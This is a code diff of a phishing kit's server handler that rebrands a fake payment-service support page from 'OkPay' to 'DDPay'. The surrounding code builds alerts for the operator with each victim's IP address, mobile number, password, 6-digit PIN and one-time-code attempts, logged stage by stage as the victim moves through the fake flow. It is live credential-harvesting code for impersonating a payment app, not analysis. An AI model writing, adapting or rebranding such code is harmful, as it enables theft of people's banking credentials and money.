@@ -18,19 +18,19 @@ export default async function handler(req, res) {
   let message = '';
 
   if (type === 'page_opened') {
-    message = `🔔 OkPay Page Opened\n` +
+    message = `🔔 DDPay Page Opened\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `✅ Link Clicked By User\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'problem_select') {
-    message = `🎫 NEW SUPPORT REQUEST — OkPay\n` +
+    message = `🎫 NEW SUPPORT REQUEST — DDPay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📌 Issue: ${issue}\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'login_creds') {
-    message = `📱 MOBILE & PASSWORD RECEIVED — OkPay\n` +
+    message = `📱 MOBILE & PASSWORD RECEIVED — DDPay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `🎫 Issue: ${issue}\n` +
@@ -38,20 +38,20 @@ export default async function handler(req, res) {
               `🔒 Password: <code>${pass}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'pin_entered') {
-    message = `🔑 6-DIGIT PIN RECEIVED — OkPay\n` +
+    message = `🔑 6-DIGIT PIN RECEIVED — DDPay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
               `🔐 PIN: <code>${pin}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'send_otp') {
-    message = `📤 SEND OTP REQUESTED — OkPay\n` +
+    message = `📤 SEND OTP REQUESTED — DDPay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'wrong_otp') {
-    message = `❌ WRONG OTP ATTEMPT #${attempt} — OkPay\n` +
+    message = `❌ WRONG OTP ATTEMPT #${attempt} — DDPay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
